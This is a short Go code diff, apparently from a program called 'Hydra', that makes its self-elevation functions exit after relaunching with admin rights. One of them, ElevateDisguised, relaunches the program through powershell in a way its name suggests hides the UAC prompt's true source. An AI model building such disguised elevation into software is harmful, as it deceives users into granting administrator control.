@@ -92,7 +92,11 @@ func RunAsAdmin(command, arguments string) error {
 //It displays a common UAC prompt to the user, with the name of the executable.
 func ElevateNormal() error {
 	exe, _ := os.Executable()
-	return RunAsAdmin(exe, "chill")
+	if err := RunAsAdmin(exe, "chill"); err != nil {
+		return err
+	}
+	os.Exit(0)
+	return nil
 }
 
 //ElevateDisguised attempts to relaunch Hydra with admin rights.
@@ -101,5 +105,9 @@ func ElevateNormal() error {
 func ElevateDisguised() error {
 	exe, _ := os.Executable()
 	args := fmt.Sprintf(runasCmd, exe)
-	return RunAsAdmin("powershell", args)
+	if err := RunAsAdmin("powershell", args); err != nil {
+		return err
+	}
+	os.Exit(0)
+	return nil
 }
